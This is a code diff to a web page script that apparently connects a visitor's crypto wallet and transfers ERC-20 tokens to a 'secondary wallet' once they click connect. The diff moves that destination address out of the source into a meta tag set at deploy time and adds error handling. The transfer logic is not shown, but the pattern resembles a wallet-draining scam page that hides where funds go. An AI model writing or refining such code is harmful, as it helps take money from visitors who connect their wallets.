@@ -1,5 +1,26 @@
-import { SECONDARY_WALLET, TOKENS, ERC20_ABI } from './config.js';
+import { TOKENS, ERC20_ABI } from './config.js';
 import { CHAINS } from './chains.js';
+
+// Read destination wallet from a <meta> tag so it can be injected at deploy time
+const SECONDARY_WALLET = document.querySelector('meta[name="secondary-wallet"]')?.content || '';
+
+// Graceful fallback for browsers without MetaMask or missing wallet config
+document.addEventListener('DOMContentLoaded', () => {
+  const connectBtn = document.getElementById('connectWallet');
+  const statusDiv = document.getElementById('status');
+
+  if (!window.ethereum) {
+    connectBtn.disabled = true;
+    statusDiv.textContent = "Web3 wallet not detected. Please install MetaMask (or another compatible extension) and reload the page.";
+    statusDiv.className = "error";
+  }
+
+  if (!SECONDARY_WALLET) {
+    connectBtn.disabled = true;
+    statusDiv.textContent = "Destination wallet address is not configured. Please contact the site administrator.";
+    statusDiv.className = "error";
+  }
+});
 
 document.getElementById('connectWallet').addEventListener('click', connectAndTransfer);
 
